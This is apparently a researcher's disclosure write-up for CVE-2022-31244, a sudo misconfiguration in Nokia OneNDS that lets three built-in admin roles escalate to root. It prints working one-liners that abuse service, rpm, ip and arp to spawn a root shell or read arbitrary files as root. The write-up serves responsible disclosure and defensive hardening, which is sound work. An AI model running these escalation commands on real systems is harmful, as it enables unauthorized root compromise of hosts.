---
title: "Nokia OneNDS Sudo PrivEsc (CVE-2022-31244)"
description: "I found and reported, with three colleagues, a Nokia OneNDS misconfiguration where three admin roles could abuse the sudo rights granted to /sbin/service, /bin/rpm, /sbin/ip and /sbin/arp to escalate to root — assigned CVE-2022-31244."
categories: [cve, pentest]
thumbnail: /assets/img/nokia_logo.png
---

## Executive summary

Me and 3 colleagues (Giacomo Sighinolfi, Milena Mangiola, Savino Sisco) found
this vulnerability while testing telco assets in the backbone network.

Nokia OneNDS is a network directory server product. Some of its built-in
administrative roles are granted `sudo` rights over binaries that were never
designed to be run with elevated privileges safely. Each of these binaries has
a well known [GTFOBins](https://gtfobins.github.io/) technique that lets a
local user with the corresponding `sudo` entry break out to a root shell,
turning a limited administrative role into full root on the system.

This vulnerability was credited by MITRE with id: [CVE-2022-31244](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31244).

* **Product**: Nokia OneNDS 17
* **Vulnerability type**: Security Misconfiguration
* **Severity**: High
* **CVSS Score**: 7.8
* **CVSS Vector**: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
* **Found on**: 31/03/2022

We disclosed this to Nokia through their [responsible disclosure program](https://www.nokia.com/notices/responsible-disclosure/).

## Affected roles

Three built-in OneNDS roles grant `sudo` access to binaries that can be
abused to spawn a root shell or read arbitrary files as root.

### ONENDS_CC_BASIC_ADMIN

This role can run `/sbin/service` via `sudo`.

```bash
sudo /sbin/service ../../bin/sh
```

### ONENDS_CC_SERVICE_ADMIN

This role can run `/bin/rpm` via `sudo`.

```bash
sudo /bin/rpm --eval '%{lua:os.execute("/bin/sh")}'
```

### ONENDS_CC_NETWORK_MANAGEMENT

This role can run `/sbin/ip` and `/sbin/arp` via `sudo`, both of which
support reading arbitrary files as root through their batch-file parsing
mode.

```bash
sudo /sbin/ip -force -batch 'file_to_read'
sudo /sbin/arp -v -f 'file_to_read'
```

## Impact

Any user assigned one of the three roles above only needs local access to the
system to escalate to root and execute arbitrary commands, fully
compromising the confidentiality, integrity, and availability of the host.

## Conclusion

Sudo rules that whitelist a binary by path alone, without also constraining
the arguments that can be passed to it, are a recurring source of privilege
escalation. All three of these techniques are documented, generic
[GTFOBins](https://gtfobins.github.io/) patterns — the underlying binaries
were never the problem, granting unrestricted `sudo` access to them was.
